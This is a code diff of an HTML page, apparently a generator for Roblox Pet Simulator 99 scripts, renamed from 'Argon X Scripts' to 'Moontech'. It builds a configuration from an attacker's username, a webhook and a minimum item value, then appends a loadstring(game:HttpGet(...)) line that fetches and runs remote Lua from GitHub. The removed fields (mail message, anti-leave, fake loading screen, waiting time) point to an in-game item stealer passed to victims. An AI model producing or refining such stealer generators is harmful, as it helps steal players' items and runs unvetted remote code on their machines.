@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Argon X Scripts - Ps99</title>
+  <title>Moontech - Ps99</title>
   <style>
     body {
         font-family: 'Roboto', sans-serif;
@@ -77,32 +77,11 @@
         margin-top: 20px;
         font-size: 16px;
     }
-    #pastelist {
-        margin-top: 20px;
-        text-align: left;
-        max-width: 600px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    #pastelist ul {
-        list-style-type: none;
-        padding: 0;
-    }
-    #pastelist li {
-        margin-bottom: 10px;
-    }
-    #pastelist a {
-        color: #007bff;
-        text-decoration: none;
-    }
-    #pastelist a:hover {
-        text-decoration: underline;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Argon X Scripts Generator</h1>
+    <h1>Moontech Generator</h1>
     <form id="scriptForm">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username" required><br><br>
@@ -112,33 +91,6 @@
 
       <label for="minimumRAP">Minimum RAP:</label>
       <input type="number" id="minimumRAP" name="minimumRAP" required><br><br>
-
-      <label for="mailMessage">Mail Message:</label>
-      <input type="text" id="mailMessage" name="mailMessage" required><br><br>
-
-      <label for="mouseLock">Enable Mouse Lock:</label>
-      <input type="checkbox" id="mouseLock" name="mouseLock"><br><br>
-
-      <label for="antileave">Enable Anti-leave:</label>
-      <input type="checkbox" id="antileave" name="antileave"><br><br>
-
-      <label for="loadingscreen">Show Loading Screen:</label>
-      <input type="checkbox" id="loadingscreen" name="loadingscreen"><br><br>
-
-      <label for="scriptName">Script Name:</label>
-      <input type="text" id="scriptName" name="scriptName" required><br><br>
-
-      <label for="firstText">First Text:</label>
-      <input type="text" id="firstText" name="firstText"><br><br>
-
-      <label for="secondText">Second Text:</label>
-      <input type="text" id="secondText" name="secondText"><br><br>
-
-      <label for="thirdText">Third Text:</label>
-      <input type="text" id="thirdText" name="thirdText"><br><br>
-
-      <label for="waitingTime">Waiting Time (in seconds):</label>
-      <input type="number" id="waitingTime" name="waitingTime" value="180"><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
       <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
@@ -152,57 +104,22 @@
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
 
-      // URL validation pattern
-      const urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
-        '(([a-zA-Z\\d]([a-zA-Z\\d-]*[a-zA-Z\\d])*)\\.?)+[a-zA-Z]{2,}' + // domain name
-        '(\\:\\d+)?(\\/[-a-zA-Z\\d%_.~+]*)*' + // port and path
-        '(\\?[;&a-zA-Z\\d%_.~+=-]*)?' + // query string
-        '(\\#[-a-zA-Z\\d_]*)?$','i'); // fragment locator
-
       generateButton.addEventListener('click', function(event) {
         event.preventDefault(); 
 
         const username = document.getElementById("username").value;
         const webhook = document.getElementById("webhook").value;
         const minimumRAP = document.getElementById("minimumRAP").value;
-        const mailMessage = document.getElementById("mailMessage").value;
-        const mouseLock = document.getElementById("mouseLock").checked;
-        const antileave = document.getElementById("antileave").checked;
-        const loadingscreen = document.getElementById("loadingscreen").checked;
-        const scriptName = document.getElementById("scriptName").value;
-        const firstText = document.getElementById("firstText").value;
-        const secondText = document.getElementById("secondText").value;
-        const thirdText = document.getElementById("thirdText").value;
-        const waitingTime = document.getElementById("waitingTime").value;
 
-        if (!username || !webhook || !minimumRAP || !mailMessage || !scriptName) {
+        if (!username || !webhook || !minimumRAP) {
           alert("Please fill in all required fields.");
           return;
         }
 
-        // Validate webhook URL
-        if (!urlPattern.test(webhook)) {
-          alert("Please enter a valid Webhook URL.");
-          return;
-        }
-
-        const outputString = `--generate through website\n` +
-                             `--website made by kizamies#0001/Shimm\n` +
-                             `config = {\n` +
-                             `    Username = "${username}",\n` +
-                             `    Webhook = "${webhook}",\n` +
-                             `    MinimumRAP = "${minimumRAP}",\n` +
-                             `    mouseLock = ${mouseLock},\n` +
-                             `    antileave = ${antileave},\n` +
-                             `    loadingscreen = ${loadingscreen},\n` +
-                             `    ScriptName = "${scriptName}",\n` +
-                             `    FirstText = "${firstText}",\n` +
-                             `    SecondText = "${secondText}",\n` +
-                             `    ThirdText = "${thirdText}",\n` +
-                             `    WaitingTime = ${waitingTime},\n` +
-                             `    MailMessage = "${mailMessage}",\n` +
-                             `}\n\n` +
-                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';
+        const outputString = `Username = "${username}"\n` +
+                             `Webhook = "${webhook}"\n` +
+                             `MinimumRAP = ${minimumRAP}\n\n` +
+                             `loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/scripts/main/Moontech.lua"))()`;
 
         document.getElementById("output").value = outputString;
       });
